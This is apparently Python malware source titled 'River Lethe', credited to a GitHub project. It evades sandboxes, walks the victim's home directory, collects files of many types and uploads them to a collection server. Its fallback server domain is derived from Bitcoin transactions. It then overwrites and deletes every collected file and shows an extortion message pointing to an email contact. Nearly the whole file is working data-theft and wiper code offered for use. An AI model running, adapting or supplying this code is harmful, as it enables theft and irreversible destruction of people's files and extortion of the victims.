# ========================================================================= #
# River Lethe
# * [x] Payload
#
# Author: rfpeixoto
# Source: https://github.com/rf-peixoto/Graverobber
# ========================================================================= #
import os
import gc
import sys
import secrets
import requests
import platform
from tkinter import *
from time import sleep
from pathlib import Path
from tkinter import messagebox
from bloxplorer import bitcoin_explorer

# ========================================================================= #
# Runs on Virtual Env?:
# ========================================================================= #
def get_prefix():
    return getattr(sys, "base_prefix", None) or getattr(sys, "real_prefix", None) or sys.prefix

def runs_on_venv():
    return get_prefix() != sys.prefix

if True:
    if runs_on_venv():
        sys.exit()
# ========================================================================= #
# Try to initialize on home:
# ========================================================================= #
if True:
    try:
        os.chdir(str(Path.home()))
    except Exception as error:
        print(error)

# ========================================================================= #
# General Setup:
# ========================================================================= #
class Tool:
    def __init__(self):
        self.files_found = []
        # Watch out! Do not include files that can run on your server. Ex: php, js, html...
        self.targets = ["txt", "pdf", "odt", "xls", "png", "jpg", "jpeg",
                        "epub", "mp3", "gif", "doc", "odp", "ods", "json", "rs",
                        "mp4", "avi", "md", "ogg", "m4a", "ini", "c", "cpp", "jar",
                        "rb", "java", "pl", "py", "apk", "raw", "eml", "msg", "tmp",
                        "conf", "config", "yaml", "asm", "h", "r", "m", "luac", "dat",
                        "sasf", "lua", "src", "perl", "c#", "go", "smali", "csproj",
                        "bash", "sh", "asic", "run", "vb", "vbe", "kt", "lsp", "vba",
                        "nt", "geojson", "c++", "ps1", "dev", "mk", "owl", "scala", "mkv",
                        "odl", "rar", "bak", "bkp", "iso", "zip", "7z", "sbf", "old", "meta",
                        "psw", "bkf", "fbk", "xar", "moz-backup", "orig", "new", "001", "bps",
                        "img", "deleted", "eg", "ren", "undo", "ofb", "da1", "sql", "bak1", "gcb",
                        "in1", "och", "exclude", "data", "$$$", "000", "bac", "arc", "assets",
                        "resource", "resS", "info", "dll", "vdx", "cache", "csv"]
        self.password_field = "" # For the interface
        self.new_server_address = "BTC Address" # For updates
        self.loop = True

tool = Tool()

# ========================================================================= #
# Primary Server Setup:
# ========================================================================= #
post_server = "http://127.0.0.1/file_form.php"

# Prepare Server Update:
def server_update():
    tx_id = 0
    try:
        while True:
            history = bitcoin_explorer.addr.get_tx_history(tool.new_server_address)
            last_tx = history.data[tx_id]
            last_value = dict(last_tx['vout'][0])['value']
            if last_value >= 10000000:
                break
            else:
                tx_id += 1
                continue
        last_domain = hashlib.md5(str(last_value).encode()).hexdigest()[8:24]
        return "http://{0}.com/file_form.php".format(last_domain)
    except Exception as error:
        print(error)

# ========================================================================= #
# Search Files:
# ========================================================================= #
for dirpath, dirs, files in os.walk(os.getcwd()):
    for f in files:
        path = os.path.abspath(os.path.join(dirpath, f))
        f_extension = path.split('.')[-1]
        if f_extension in tool.targets:
            tool.files_found.append(path)

# ========================================================================= #
# Wait Server Response:
# ========================================================================= #
if True:
    while True:
        ping = os.system("ping -c 1 " + post_server[:-14])
        if ping == 0:
            break
        else:
            try:
                post_server = server_update()
            except Exception as error:
                sleep(300)
                continue

# ========================================================================= #
# Upload Files Found:
# ========================================================================= #
if True:
    # Send files
    for f in tool.files_found:
        tmp_data = open(f, "rb")
        try:
            tmp_response = requests.post(post_server, files = {"fileToUpload": tmp_data})
            tmp_data.close()
        except Exception as error:
            print(error)
        sleep(0.1)

# ========================================================================= #
# Shred:
# ========================================================================= #
# Loop files:
for f in tool.files_found:
    try:
        # Ignore this file and progress log:
        if f != sys.argv[0]:
            # First wipe:
            with open(f, 'wb') as fl:
                fl.write(secrets.token_hex(24).encode())
            # Loop of destruction:
            for i in range(3):
                file_data = open(f, 'wb')
                file_data.write(secrets.token_hex(24).encode())
                file_data.close()
            # Rename & unlink:
            new_name = 'lethe.{0}'.format(secrets.token_hex(8))
            os.rename(f, new_name)
            os.unlink(new_name)
    except Exception as error:
        print(error)
# All files done?
gc.collect()

# ========================================================================= #
# GUI:
# ========================================================================= #
window = Tk()
window.title("River Lethe")
phrase_a = Label(window, text="Everything you had is lost in oblivion.")
phrase_a.grid(column=0, row=0)

phrase_b = Label(window, text="Send a signal to EMAIL and we will try to guide you.")
phrase_b.grid(column=0, row=1)

# ========================================================================= #
# Loop:
# ========================================================================= #
while tool.loop:
    window.update()
window.destroy()
